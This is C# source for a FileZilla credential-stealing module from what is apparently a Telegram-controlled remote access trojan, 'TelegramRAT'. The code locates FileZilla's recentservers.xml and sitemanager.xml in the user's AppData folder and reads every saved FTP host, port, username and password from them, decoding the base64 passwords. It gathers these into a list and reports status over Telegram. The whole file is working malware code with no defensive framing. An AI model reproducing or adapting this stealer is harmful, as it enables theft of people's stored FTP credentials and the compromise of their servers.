using System;
using System.IO;
using System.Xml;
using System.Text;
using System.Collections.Generic;

namespace TelegramRAT
{
    internal class FileZilla
    {
        public static List<Dictionary<string, string>> get()
        {
            // Path info
            string FileZillaPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
            string SiteManagerPath = FileZillaPath + "sitemanager.xml";
            string RecentServersPath = FileZillaPath + "recentservers.xml";

            // List
            List<Dictionary<string, string>> fzServers = new List<Dictionary<string, string>>();

            // If not installed
            if (!Directory.Exists(FileZillaPath))
            {
                telegram.sendText("🛠 FileZilla not installed");
                return fzServers;
            }

            // Get data from recentserver.xml
            if (File.Exists(RecentServersPath))
            {
                try
                {
                    XmlDocument doc = new XmlDocument();
                    doc.Load(RecentServersPath);
                    foreach (XmlNode node in doc.GetElementsByTagName("Server"))
                    {
                        // Get values
                        string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
                        string username = node["User"].InnerText;
                        string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
                        // Add to list
                        Dictionary<string, string> credentials = new Dictionary<string, string>
                        {
                            ["url"] = url,
                            ["username"] = username,
                            ["password"] = password
                        };
                        fzServers.Add(credentials);
                    }
                } catch {
                    telegram.sendText("⛔ Failed to read recentserver.xml");
                }
            }
            // Get data from sitemanager.xml
            if (File.Exists(SiteManagerPath))
            {
                try
                {
                    XmlDocument doc = new XmlDocument();
                    doc.Load(SiteManagerPath);
                    foreach (XmlNode node in doc.GetElementsByTagName("Server"))
                    {
                        // Get values
                        string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
                        string username = node["User"].InnerText;
                        string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
                        // Add to list
                        Dictionary<string, string> credentials = new Dictionary<string, string>
                        {
                            ["url"] = url,
                            ["username"] = username,
                            ["password"] = password
                        };
                        fzServers.Add(credentials);
                    }
                } catch
                {
                    telegram.sendText("⛔ Failed to read sitemanager.xml");
                }
                
            }

            return fzServers;
        }
    }
}
